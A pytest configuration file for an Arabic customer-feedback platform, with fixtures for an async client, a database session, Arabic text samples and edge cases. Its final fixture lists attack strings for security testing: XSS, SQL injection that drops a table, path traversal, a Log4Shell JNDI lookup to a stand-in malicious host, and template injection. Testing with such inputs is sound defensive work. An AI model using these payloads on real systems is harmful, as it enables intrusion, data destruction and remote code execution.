"""
Pytest configuration and fixtures for Arabic VoC platform testing
"""

import pytest
import asyncio
import os
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker

# Test database configuration
TEST_DATABASE_URL = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///./test.db")

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture
async def async_client():
    """Create async HTTP client for API testing"""
    # Import the FastAPI app for testing (before WSGI wrapper)
    import main
    # Use the original FastAPI app stored as fastapi_app
    if hasattr(main, 'fastapi_app'):
        app = main.fastapi_app
    else:
        # Fallback: create a new FastAPI instance for testing
        from fastapi import FastAPI
        from fastapi.middleware.cors import CORSMiddleware
        app = FastAPI(title="Test App")
        app.add_middleware(CORSMiddleware, allow_origins=["*"])
    
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client

@pytest.fixture
async def db_session():
    """Create async database session for testing"""
    engine = create_async_engine(TEST_DATABASE_URL, echo=False)
    SessionLocal = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)
    
    async with SessionLocal() as session:
        yield session

# Arabic test data fixtures
@pytest.fixture
def arabic_feedback_samples():
    """Sample Arabic feedback texts for testing"""
    return [
        "الخدمة ممتازة جداً وأنصح بها بشدة",  # Excellent service, highly recommend
        "المنتج سيء ولا أنصح بشرائه",  # Bad product, don't recommend
        "التطبيق جيد لكن يحتاج تحسينات",  # App is good but needs improvements
        "فريق الدعم سريع ومفيد جداً",  # Support team is fast and very helpful
        "التسليم متأخر والجودة متوسطة",  # Late delivery and average quality
        "أحب هذا المتجر وأتسوق منه دائماً",  # Love this store, always shop here
        "الموقع الإلكتروني لا يعمل بشكل صحيح",  # Website not working properly
        "منتج رائع بسعر معقول جداً",  # Great product at very reasonable price
    ]

@pytest.fixture
def arabic_edge_cases():
    """Arabic text edge cases for testing"""
    return [
        "تَشْكِيلٌ كَامِلٌ مَعَ الْحَرَكَاتِ",  # Full diacritics
        "نص مختلط عربي English mixed text",  # Mixed Arabic/English
        "أرقام ٠١٢٣٤٥٦٧٨٩ عربية",  # Arabic numerals
        "رموز !@#$%^&*() مع العربية",  # Symbols with Arabic
        "نص طويل جداً " * 100,  # Very long text
        "",  # Empty string
        "   ",  # Whitespace only
        "🤔 إيموجي مع العربية 😊",  # Emojis with Arabic
        "لغات متعددة: العربية français English 中文",  # Multiple languages
    ]

@pytest.fixture
def malicious_inputs():
    """Potentially malicious inputs for security testing"""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE feedback; --",
        "../../../etc/passwd",
        "${jndi:ldap://malicious.com/a}",
        "{{7*7}}",  # Template injection
        "\x00\x01\x02",  # Null bytes
        "A" * 10000,  # Very long input
        "eval(document.cookie)",
        "javascript:alert('xss')",
    ]